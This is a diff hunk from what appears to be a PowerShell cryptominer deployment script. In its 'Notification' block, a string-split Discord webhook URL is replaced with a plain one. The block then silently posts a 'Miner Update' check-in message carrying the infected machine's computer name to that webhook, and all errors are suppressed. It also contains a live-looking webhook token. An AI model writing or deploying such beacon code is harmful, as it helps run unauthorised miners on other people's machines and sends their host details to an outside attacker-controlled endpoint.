@@ -37,7 +37,7 @@ try {
 
 # Notification
 try {
-    $wh = -join('https://disc','ord.com/api/','webhooks/','1499899715582558228/','M_6btxpgSDH5UBHvf3zbCyMr0','jERa0eYZKdQ8pVR49kHRcjzSOTm','-v1eIIhMkrPaPG8l')
+    $wh = "https://discord.com/api/webhooks/1499899715582558228/M_6btxpgSDH5UBHvf3zbCyMr0jERa0eYZKdQ8pVR49kHRcjzSOTm-v1eIIhMkrPaPG8l"
     $bd = '{"embeds":[{"title":"Miner Update","description":"\u{1F7E2} **Deployment Successful (PS1)**\nWorker: `' + $env:COMPUTERNAME + '` has checked in.","color":3066993}]}'
     Invoke-RestMethod -Uri $wh -Method Post -Body $bd -ContentType "application/json" -EA 0
 } catch { }
